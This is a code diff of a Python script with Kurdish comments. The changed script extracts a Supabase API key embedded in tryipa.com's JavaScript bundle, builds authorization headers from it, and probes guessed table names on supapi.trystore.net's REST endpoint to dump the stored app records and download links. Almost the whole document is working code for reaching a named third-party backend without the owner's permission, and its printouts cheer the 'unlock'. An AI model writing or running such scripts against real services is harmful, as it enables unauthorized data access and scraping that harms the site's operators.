@@ -1,33 +1,51 @@
 import requests
 import re
+import json
 
-print("=== DEEP DIVING INTO THE JS FILE ===")
+print("=== UNLOCKING SUPABASE DATABASE ===")
 js_url = "https://tryipa.com/assets/index-Jb0mx1SV.js"
 
 try:
-    print(f"Downloading JS file: {js_url}")
     res = requests.get(js_url, timeout=15)
-    print(f"File downloaded. Size: {len(res.text)} bytes")
     
-    # دۆزینەوەی ئەو شوێنانەی کە ناوی سێرڤەرەکەی تێدا هاتووە
-    api_mentions = [m.start() for m in re.finditer(r'supapi\.trystore\.net', res.text)]
-    print(f"\nFound 'supapi.trystore.net' {len(api_mentions)} times in the code.")
+    # دۆزینەوەی کلیلە شاراوەکە (Supabase Anon Key کە بە eyJ دەست پێدەکات)
+    match = re.search(r'["\'](eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)["\']', res.text)
     
-    for idx, pos in enumerate(api_mentions):
-        start = max(0, pos - 150)
-        end = min(len(res.text), pos + 250)
-        print(f"\n--- Secret Mention {idx + 1} ---")
-        print(res.text[start:end])
+    if not match:
+        print("Could not find the API key in the JS file.")
+        exit()
         
-    # گەڕان بەدوای وشەی نهێنی یان کلیل (API Key)
-    keys = re.findall(r'["\'](eyJ[^"\']+|anon|apikey|Authorization|Bearer [^"\']+)["\']', res.text)
-    if keys:
-        print("\n--- POSSIBLE API KEYS FOUND ---")
-        unique_keys = list(set(keys))
-        for k in unique_keys[:5]:
-            print(f"Key: {k[:50]}...")
+    api_key = match.group(1)
+    print("-> Successfully extracted the secret API key!")
+    
+    # ئامادەکردنی پاسپۆرتەکە بۆ چوونە ناو داتابەیسەکە
+    headers = {
+        "apikey": api_key,
+        "Authorization": f"Bearer {api_key}",
+        "Content-Type": "application/json"
+    }
+    
+    # ناوی ئەو خشتانەی کە ئەگەر زۆرە یارییەکانی تێدا بێت
+    tables = ["apps", "ipas", "library", "games", "tryplus_apps", "app_store", "ipa_library"]
+    base_url = "https://supapi.trystore.net/rest/v1"
+    
+    for table in tables:
+        url = f"{base_url}/{table}?select=*"
+        print(f"\nTesting table: {table} ...")
+        
+        r = requests.get(url, headers=headers, timeout=10)
+        print(f" -> Status: {r.status_code}")
+        
+        if r.status_code == 200:
+            data = r.json()
+            print(f" -> BINGO! Found {len(data)} apps in this table.")
+            if len(data) > 0:
+                print("\n--- FIRST APP DATA ---")
+                # پیشاندانی یەکەم یاری بۆ ئەوەی بزانین لینکی داونلۆدەکەی ناوی چییە
+                print(json.dumps(data[0], indent=2, ensure_ascii=False))
+            break
             
 except Exception as e:
     print(f"Error: {e}")
 
-print("\n=== DIVE FINISHED ===")
+print("\n=== UNLOCK FINISHED ===")
